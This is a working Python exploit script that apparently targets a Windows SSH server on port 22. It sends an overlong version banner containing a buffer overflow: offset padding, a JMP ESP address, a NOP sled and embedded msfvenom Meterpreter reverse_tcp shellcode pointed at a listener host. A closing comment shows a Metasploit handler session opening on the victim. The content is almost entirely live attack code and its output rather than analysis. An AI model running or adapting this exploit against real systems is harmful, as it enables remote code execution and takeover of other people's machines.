#!/usr/bin/python

import socket, sys
import time

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((sys.argv[1], 22))

message = sock.recv(1000)

print message

buffer = ("\x53\x53\x48\x2d\x31\x2e\x39\x39\x2d\x4f\x70\x65\x6e\x53\x53\x48"
          "\x5f\x33\x2e\x34\x0a\x00\x00\x4f\x04\x05\x14\x00\x00\x00\x00\x00"
          "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\xde")

# EIP overwrite
# ./pattern_offset.rb -q 326A4231
# [*] Exact match at offset 1055

# Top of the stack
# ./pattern_offset.rb -q 6A42346A
# [*] Exact match at offset 1063

buffer += "A" * 1055

"""
Run the program
View -> Executable Modules -> USER32.dll
Search for -> Command -> JMP ESP -> Note tha address
Replace BBBB with the address
This address will jump back to where the shellcode is located
"""

buffer += "\x53\x93\x42\x7e"

buffer += "AAAA"

buffer += "\x90" * 100

# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.13 -f c -a x86 -b "\x00"
buffer += ("\xd9\xc4\xba\x6f\xea\x80\xa2\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x54\x83\xeb\xfc\x31\x53\x14\x03\x53\x7b\x08\x75\x5e\x6b\x4e"
"\x76\x9f\x6b\x2f\xfe\x7a\x5a\x6f\x64\x0e\xcc\x5f\xee\x42\xe0"
"\x14\xa2\x76\x73\x58\x6b\x78\x34\xd7\x4d\xb7\xc5\x44\xad\xd6"
"\x45\x97\xe2\x38\x74\x58\xf7\x39\xb1\x85\xfa\x68\x6a\xc1\xa9"
"\x9c\x1f\x9f\x71\x16\x53\x31\xf2\xcb\x23\x30\xd3\x5d\x38\x6b"
"\xf3\x5c\xed\x07\xba\x46\xf2\x22\x74\xfc\xc0\xd9\x87\xd4\x19"
"\x21\x2b\x19\x96\xd0\x35\x5d\x10\x0b\x40\x97\x63\xb6\x53\x6c"
"\x1e\x6c\xd1\x77\xb8\xe7\x41\x5c\x39\x2b\x17\x17\x35\x80\x53"
"\x7f\x59\x17\xb7\x0b\x65\x9c\x36\xdc\xec\xe6\x1c\xf8\xb5\xbd"
"\x3d\x59\x13\x13\x41\xb9\xfc\xcc\xe7\xb1\x10\x18\x9a\x9b\x7c"
"\xed\x97\x23\x7c\x79\xaf\x50\x4e\x26\x1b\xff\xe2\xaf\x85\xf8"
"\x05\x9a\x72\x96\xf8\x25\x83\xbe\x3e\x71\xd3\xa8\x97\xfa\xb8"
"\x28\x18\x2f\x54\x2c\x8e\x10\x01\x2f\x43\xf9\x50\x30\x4a\xa5"
"\xdd\xd6\x3c\x05\x8e\x46\xfc\xf5\x6e\x37\x94\x1f\x61\x68\x84"
"\x1f\xab\x01\x2e\xf0\x02\x79\xc6\x69\x0f\xf1\x77\x75\x85\x7f"
"\xb7\xfd\x2c\x7f\x79\xf6\x45\x93\x6d\x67\xa6\x6b\x6d\x02\xa6"
"\x01\x69\x84\xf1\xbd\x73\xf1\x36\x62\x8c\xd4\x44\x65\x72\xa9"
"\x7c\x1d\x44\x3f\xc1\x49\xa8\xaf\xc1\x89\xfe\xa5\xc1\xe1\xa6"
"\x9d\x91\x14\xa9\x0b\x86\x84\x3f\xb4\xff\x79\xe8\xdc\xfd\xa4"
"\xde\x42\xfd\x82\x5d\x84\x01\x50\x43\x2d\x6a\xaa\xc3\xcd\x6a"
"\xc0\xc3\x9d\x02\x1f\xec\x12\xe3\xe0\x27\x7b\x6b\x6a\xa9\xc9"
"\x0a\x6b\xe0\x8c\x92\x6c\x06\x15\xc2\xe2\xe9\xaa\xeb\x04\xd6"
"\x7c\xd2\x72\x1f\xbd\x61\x8c\x2a\xe0\xc0\x07\x54\xb6\x13\x02")

buffer += "C" * ( 22000 -  len(buffer) )

buffer += "\r\n"

sock.send(buffer)

time.sleep(5)

sock.close()

"""
$ msfconsole 
                                                  
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %  %%%%%%%%   %%%%%%%%%%% http://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


Frustrated with proxy pivoting? Upgrade to layer-2 VPN pivoting with
Metasploit Pro -- learn more on http://rapid7.com/metasploit

       =[ metasploit v4.12.23-dev                         ]
+ -- --=[ 1577 exploits - 907 auxiliary - 272 post        ]
+ -- --=[ 455 payloads - 39 encoders - 8 nops             ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf > use exploit/multi/handler 
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.1.13
LHOST => 192.168.1.13
msf exploit(handler) > exploit 

[*] Started reverse TCP handler on 192.168.1.13:4444 
[*] Starting the payload handler...
[*] Sending stage (957999 bytes) to 192.168.1.12
[*] Meterpreter session 1 opened (192.168.1.13:4444 -> 192.168.1.12:1054) at 2017-02-26 16:09:19 -0500

meterpreter > getuid
Server username: ABC\kanishka
meterpreter > 
"""
